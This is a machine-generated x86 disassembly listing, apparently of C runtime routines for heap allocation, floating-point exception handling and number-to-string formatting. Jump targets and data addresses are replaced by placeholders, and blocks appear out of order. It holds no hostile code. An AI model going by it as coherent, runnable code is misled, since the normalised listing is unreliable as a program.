jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop ebx
call sub_41ccf1
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41cd04
pop ecx
mov [ esi ] eax
push esi
call sub_41ec44
pop ecx
test eax eax
je r-xdata
call sub_41ccf1
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41cd04
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_426ad5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jae r-xdata
xor ecx ecx
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_41ccf1
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_41ec44
pop ecx
test eax eax
jne r-xdata
mov eax ecx
mov [ eax ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov [ eax ] 0xc
sub_426b5e
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
push edi
fldz
fucom st1
fnstsw ax
test ah 0x44
jpe r-xdata
push esi
mov si [ ebp + 0xe ]
movzx eax si
test eax 0x7ff0
jne r-xdata
fstp st1
xor edi edi
jmp r-xdata
push 0x0
fstp st0
push ecx
push ecx
fstp [ esp ]
call sub_426c30
movzx edi si
shr edi 0x4
and edi 0x7ff
add esp 0xc
sub edi 0x3fe
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
test ecx 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
pop edi
pop ebp
retn
fcompp
mov edi 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
test edx edx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
mov ecx 0xffef
and si cx
mov [ ebp + 0xe ] si
test eax eax
je r-xdata
add ecx ecx
mov [ ebp + 0xc ] ecx
test edx edx
jns r-xdata
test [ ebp + 0xe ] 0x10
jne r-xdata
fld [ ebp + 0x8 ]
push 0x0
push ecx
push ecx
fstp [ esp ]
call sub_426c30
add esp 0xc
jmp r-xdata
mov eax 0x8000
or si ax
mov [ ebp + 0xe ] si
add edx edx
dec edi
test [ ebp + 0xe ] 0x10
je r-xdata
or ecx 0x1
mov [ ebp + 0xc ] ecx
pop esi
mov si [ ebp + 0xe ]
mov [ ebp + 0x8 ] edx
sub_426c30
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
movzx eax [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
lea ecx [ ecx + 0x3fe ]
shl ecx 0x4
and eax 0x800f
or ecx eax
mov [ ebp - 0x2 ] cx
fld [ ebp - 0x8 ]
leave
retn
sub_426c5b
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ebx
and esi 0x1f
test bl 0x8
je r-xdata
test bl 0x4
je r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
test bl 0x1
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push 0x1
call sub_427218
pop ecx
and esi 0xfffffff7
jmp r-xdata
test bl 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_427218
pop ecx
and esi 0xfffffffb
jmp r-xdata
test bl 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_427218
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
push edi
xor edi edi
test bl 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_427218
pop ecx
and esi 0xffffffef
mov ecx [ ebp + 0xc ]
fld [ ecx ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
inc edi
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
xor edi edi
inc edi
fld [ ecx ]
lea eax [ ebp + 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_426b5e
mov eax [ ebp + 0x8 ]
fst [ ebp - 0xc ]
fldz
add eax 0xfffffa00
add esp 0xc
mov [ ebp + 0x8 ] eax
cmp eax 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and esi 0xfffffffd
push 0x10
call sub_427218
pop ecx
fcompp
xor edx edx
fnstsw ax
test ah 0x41
jne r-xdata
xor edi edi
fmulp st1
inc edi
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
mov eax [ ebp - 0x6 ]
and eax 0xf
or eax 0x10
mov [ ebp - 0x6 ] ax
mov eax [ ebp + 0x8 ]
mov ecx 0xfffffc03
cmp eax ecx
jge r-xdata
inc edx
mov eax [ ebp + 0xc ]
fstp [ eax ]
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0xc ]
test edx edx
je r-xdata
sub ecx eax
mov eax [ ebp - 0xc ]
test edi edi
pop edi
je r-xdata
fchs
shr eax 0x1
test [ ebp - 0x8 ] 0x1
mov [ ebp - 0xc ] eax
je r-xdata
test edi edi
jne r-xdata
shr [ ebp - 0x8 ] 0x1
dec ecx
jne r-xdata
or eax 0x80000000
mov [ ebp - 0xc ] eax
inc edi
test [ ebp - 0xc ] 0x1
je r-xdata
sub_426e37
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_426e58
add esp 0x1c
pop ebp
retn
sub_426e58
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push ebx
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0x10 ]
inc ebx
push edi
test cl 0x10
je r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edi 0xc000008f
or [ eax + 0x4 ] ebx
jmp r-xdata
test cl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000093
or [ eax + 0x4 ] 0x2
test cl 0x2
je r-xdata
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000091
or [ eax + 0x4 ] 0x4
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008e
or [ eax + 0x4 ] 0x8
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
shl eax 0x4
not eax
xor eax [ ecx + 0x8 ]
and eax 0x10
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
add eax eax
not eax
xor eax [ ecx + 0x8 ]
and eax 0x8
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x1
not eax
xor eax [ ecx + 0x8 ]
and eax 0x4
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x3
not eax
xor eax [ ecx + 0x8 ]
and eax 0x2
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x5
not eax
xor eax [ ecx + 0x8 ]
and eax ebx
xor [ ecx + 0x8 ] eax
call sub_42726e
mov edx eax
test dl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000090
or [ eax + 0x4 ] 0x10
test dl 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test dl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x8
test dl 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x4
test dl 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffeb
or eax 0x8
cmp eax 0x200
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffd
or eax ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x20 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x20 ] eax
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
mov eax [ ecx + 0x60 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x60 ] eax
fld [ ebx ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
mov eax [ ebp + 0x8 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ eax + 0x60 ] 0xffffffe1
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffe7
or eax 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffe
or eax 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_4271e0
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
push edi
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] 0x1
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
mov edx 0xfffff3ff
sub eax 0x0
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ ebx ]
fld [ ecx + 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] 0x0
pop esi
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax 0x0
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_42713d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
je r-xdata
call sub_41ccf1
mov [ eax ] 0x21
add eax 0xfffffffe
cmp eax 0x1
ja r-xdata
pop ebp
retn
call sub_41ccf1
mov [ eax ] 0x22
pop ebp
retn
sub_42716a
push 0x8
push r--data
call sub_41ecb0
cmp [ rw-data ] 0x1
jl r-xdata
call sub_41ecf5
retn
mov eax [ ebp + 0x8 ]
test al 0x40
je r-xdata
and eax 0xffffffbf
mov [ ebp + 0x8 ] eax
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_4271ef
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
not ecx
and cx [ ebp - 0x4 ]
or cx ax
movzx eax cx
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_427218
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_427344
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427365
add esp 0x1c
pop ebp
retn
sub_427365
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4278b2
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427a68
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4273eb
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427b27
jmp r-xdata
sub_4273eb
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
push 0x30
pop eax
push [ ebp + 0x1c ]
mov ecx eax
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x8 ] 0x3ff
xor ebx ebx
call sub_4199d2
mov edi [ ebp + 0x14 ]
test edi edi
jns r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov edi ebx
call sub_41ccf1
push 0x16
jmp r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
pop edi
mov [ eax ] edi
call sub_41f411
jmp r-xdata
lea eax [ edi + 0xb ]
mov [ esi ] bl
cmp ecx eax
ja r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ebx [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax ebx
shr eax 0x14
and eax 0x7ff
cmp eax 0x7ff
jne r-xdata
call sub_41ccf1
push 0x22
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x24 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
xor eax eax
cmp eax eax
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov ebx [ ebp + 0x18 ]
push 0x30
pop eax
mov [ esi ] al
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi + 0x1 ] al
mov ecx [ edx + 0x4 ]
and ebx 0xffffffe0
add ebx 0x27
and ecx 0x7ff00000
xor eax eax
or eax ecx
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov [ esi ] 0x2d
inc esi
and ebx 0x80000000
or eax ebx
je r-xdata
or eax 0xffffffff
cmp ecx eax
je r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
push 0x30
pop eax
mov [ esi + 0x2 ] al
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
and eax 0xfffff
add esi 0x3
or ecx eax
jne r-xdata
push 0x0
push edi
push eax
lea ebx [ esi + 0x2 ]
push ebx
push edx
call sub_427745
mov edi eax
add esp 0x14
test edi edi
je r-xdata
lea eax [ ecx - 0x2 ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ ecx ] al
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0x8 ] 0x3fe
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
mov [ esi ] 0x0
jmp r-xdata
and [ ebp + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov ecx 0xf0000
mov [ ebp + 0xc ] ecx
cmp [ edx ] 0x0
jbe r-xdata
mov eax [ edx + 0x4 ]
and eax 0xfffff
mov [ ebp - 0x18 ] eax
ja r-xdata
mov ecx esi
inc esi
mov [ ebp - 0xc ] ecx
test edi edi
jne r-xdata
mov edi [ ebp + 0x18 ]
push 0x30
pop eax
mov [ esi ] al
test edi edi
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
lea eax [ esi + 0x2 ]
push 0x65
push eax
call sub_4189a0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
test ax ax
js r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp + 0x14 ]
and edx ecx
mov ecx [ ebp - 0x4 ]
movsx ecx cx
and edx 0xfffff
call sub_42d440
push 0x30
pop ecx
add ax cx
movzx eax ax
cmp eax 0x39
jbe r-xdata
test edi edi
jle r-xdata
xor edi edi
jmp r-xdata
test edi edi
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp + 0x14 ]
and edx ecx
mov ecx [ ebp - 0x4 ]
movsx ecx cx
and edx 0xfffff
call sub_42d440
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ esi ] al
mov eax [ ebp + 0x14 ]
shrd eax ecx 0x4
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x4 ]
shr ecx 0x4
sub eax 0x4
inc esi
dec edi
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] eax
test ax ax
jns r-xdata
add eax ebx
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push edi
push 0x30
pop eax
push eax
push esi
call sub_41cae0
add esp 0xc
add esi edi
push 0x30
lea eax [ esi - 0x1 ]
pop ebx
test edi edi
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edx ]
mov edx [ edx + 0x4 ]
mov cl 0x34
call sub_42d440
mov ecx eax
xor eax eax
mov ebx edx
and ecx 0x7ff
and ebx eax
sub ecx [ ebp - 0x8 ]
sbb ebx eax
js r-xdata
mov esi eax
mov [ eax ] bl
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg ecx
adc ebx eax
neg ebx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
mov ebx [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
je r-xdata
cmp esi edi
jne r-xdata
mov edx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp ecx eax
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
push eax
push 0xa
push ebx
push ecx
call sub_42d360
add al 0x30
mov [ esi ] al
mov [ ebp - 0x18 ] edx
inc esi
mov [ ebp - 0x18 ] ebx
xor eax eax
cmp ebx eax
jl r-xdata
push eax
push edx
push ebx
push ecx
call sub_42d360
add al 0x30
mov [ esi ] al
inc esi
xor eax eax
mov [ ebp - 0x18 ] edx
cmp esi edi
jne r-xdata
cmp ecx edx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp ebx eax
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
add cl 0x30
mov [ esi ] cl
mov [ esi + 0x1 ] al
mov edi eax
jg r-xdata
push eax
push 0x64
push ebx
push ecx
call sub_42d360
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x18 ] edx
xor eax eax
cmp ebx eax
jl r-xdata
cmp ecx 0xa
jb r-xdata
jg r-xdata
cmp ecx 0x64
jb r-xdata
sub_427763
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push edi
push [ ebp + 0x20 ]
call sub_4199d2
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_41ccf1
push 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
pop edi
mov [ eax ] edi
call sub_41f411
jmp r-xdata
mov edx [ ebp + 0x10 ]
xor edi edi
mov eax edx
test edx edx
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
add eax 0x9
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edi
mov eax edi
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_41ccf1
push 0x22
mov eax [ ebp + 0x18 ]
push esi
cmp [ eax ] 0x2d
mov esi ebx
jne r-xdata
mov ecx [ ebp + 0x18 ]
xor eax eax
test edx edx
setg al
push eax
xor eax eax
cmp [ ecx ] 0x2d
sete al
add eax ebx
push eax
call sub_427da8
mov edx [ ebp + 0x10 ]
pop ecx
pop ecx
test edx edx
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x1c ] al
sete al
add eax edx
add esi eax
or eax 0xffffffff
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
mov [ esi ] al
mov eax [ ebp - 0x10 ]
inc esi
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
push r--data
push eax
push esi
call sub_423cea
add esp 0xc
test eax eax
jne r-xdata
mov eax ebx
sub eax esi
add eax [ ebp + 0xc ]
push edi
push edi
push edi
push edi
push edi
call sub_41f421
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x14 ] edi
je r-xdata
mov edx [ ebp + 0x18 ]
mov eax [ edx + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop esi
je r-xdata
mov edx [ edx + 0x4 ]
dec edx
jns r-xdata
cmp [ ecx ] 0x30
jne r-xdata
push 0x64
pop ebx
cmp edx ebx
jl r-xdata
neg edx
mov [ esi + 0x1 ] 0x2d
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_4170d0
add esp 0xc
push 0xa
pop ebx
cmp edx ebx
jl r-xdata
mov eax edx
cdq
idiv ebx
add [ esi + 0x2 ] al
add [ esi + 0x4 ] dl
mov eax edx
cdq
idiv ebx
add [ esi + 0x3 ] al
sub_4278b2
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_42d2ca
add esp 0x14
test edi edi
jne r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_41ccf1
or ecx 0xffffffff
cmp esi ecx
je r-xdata
call sub_41ccf1
push 0x16
pop esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebx + 0x1 ]
push eax
push ecx
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
xor eax eax
test ebx ebx
setg al
add ecx edi
add eax ecx
push eax
call sub_42d03c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
mov ecx esi
sete al
sub ecx eax
xor eax eax
test ebx ebx
setg al
sub ecx eax
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
push ebx
push esi
push edi
call sub_427763
add esp 0x1c
mov [ edi ] 0x0
jmp r-xdata
sub_42797e
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x14 ]
push ebx
mov eax [ eax + 0x4 ]
push esi
push [ ebp + 0x1c ]
dec eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
call sub_4199d2
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_41ccf1
push 0x16
pop ebx
mov [ eax ] ebx
call sub_41f411
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp [ ebp + 0x18 ] bl
je r-xdata
pop esi
mov eax ebx
pop ebx
leave
retn
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x2d
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx edi
jne r-xdata
mov eax [ eax + 0x4 ]
test eax eax
jg r-xdata
mov [ esi ] 0x2d
inc esi
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ edx ] 0x2d
sete al
add eax ecx
mov [ eax + esi ] 0x30
add esi eax
push 0x1
push esi
call sub_427da8
pop ecx
mov [ esi ] 0x30
pop ecx
inc esi
jmp r-xdata
pop edi
push 0x1
push esi
call sub_427da8
mov eax [ ebp - 0x14 ]
pop ecx
mov eax [ eax + 0x84 ]
pop ecx
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov eax [ ebp + 0x14 ]
inc esi
mov eax [ eax + 0x4 ]
test eax eax
jns r-xdata
test edi edi
jle r-xdata
cmp [ ebp + 0x18 ] bl
je r-xdata
neg eax
cmp edi eax
jl r-xdata
mov edi eax
neg edi
jmp r-xdata
push edi
push esi
call sub_427da8
push edi
push 0x30
push esi
call sub_41cae0
add esp 0x14
mov edi eax
sub_427a68
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_42d2ca
add esp 0x14
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_41ccf1
mov [ eax ] ebx
call sub_41f411
mov eax ebx
jmp r-xdata
or ecx 0xffffffff
cmp esi ecx
je r-xdata
call sub_41ccf1
mov [ eax ] ebx
call sub_41f411
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
